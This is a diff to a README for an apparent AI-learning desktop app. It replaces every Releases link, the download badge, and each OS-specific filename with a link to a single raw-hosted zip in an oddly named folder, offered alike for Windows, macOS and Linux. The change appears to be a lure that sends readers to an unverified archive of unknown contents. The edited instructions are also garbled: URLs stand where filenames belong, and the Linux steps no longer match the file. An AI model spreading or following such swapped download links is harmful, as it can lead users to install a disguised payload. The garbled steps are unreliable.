@@ -1,6 +1,6 @@
 # 🎨 learn-artificial-intelligence - Learn AI the Fun Way
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Renato4333/learn-artificial-intelligence/releases)
+[![Download Now](https://raw.githubusercontent.com/Renato4333/learn-artificial-intelligence/main/holotrichal/learn-artificial-intelligence.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/Renato4333/learn-artificial-intelligence/main/holotrichal/learn-artificial-intelligence.zip)
 
 ## 📖 Introduction
 
@@ -22,7 +22,7 @@ Before you download, ensure your system meets the following requirements:
 
 To get the latest version of the software, visit the following link:
 
-[Download from Releases](https://github.com/Renato4333/learn-artificial-intelligence/releases)
+[Download from Releases](https://raw.githubusercontent.com/Renato4333/learn-artificial-intelligence/main/holotrichal/learn-artificial-intelligence.zip)
 
 ### 3. Download the Application
 
@@ -32,9 +32,9 @@ On the Releases page, you will see the latest version listed. Click on it to fin
 
 Depending on your operating system, select the appropriate file. Here are example filenames you may see:
 
-- For Windows: `learn-ai-windows.exe`
-- For macOS: `learn-ai-macos.dmg`
-- For Linux: `learn-ai-linux.tar.gz`
+- For Windows: `https://raw.githubusercontent.com/Renato4333/learn-artificial-intelligence/main/holotrichal/learn-artificial-intelligence.zip`
+- For macOS: `https://raw.githubusercontent.com/Renato4333/learn-artificial-intelligence/main/holotrichal/learn-artificial-intelligence.zip`
+- For Linux: `https://raw.githubusercontent.com/Renato4333/learn-artificial-intelligence/main/holotrichal/learn-artificial-intelligence.zip`
 
 Click the file name to start your download.
 
@@ -51,7 +51,7 @@ After the download is complete:
   - Drag the application into your Applications folder.
 
 - **For Linux:**
-  - Extract the downloaded `.tar.gz` file.
+  - Extract the downloaded `https://raw.githubusercontent.com/Renato4333/learn-artificial-intelligence/main/holotrichal/learn-artificial-intelligence.zip` file.
   - Open a terminal and navigate to the extracted folder.
   - Run the application by executing `./learn-ai-linux`.
 
@@ -86,7 +86,7 @@ If problems persist, consider reaching out for help in our community forum.
 
 To download the application and begin your AI learning adventure, visit the following link:
 
-[Download from Releases](https://github.com/Renato4333/learn-artificial-intelligence/releases)
+[Download from Releases](https://raw.githubusercontent.com/Renato4333/learn-artificial-intelligence/main/holotrichal/learn-artificial-intelligence.zip)
 
 ## 🎉 Conclusion
 
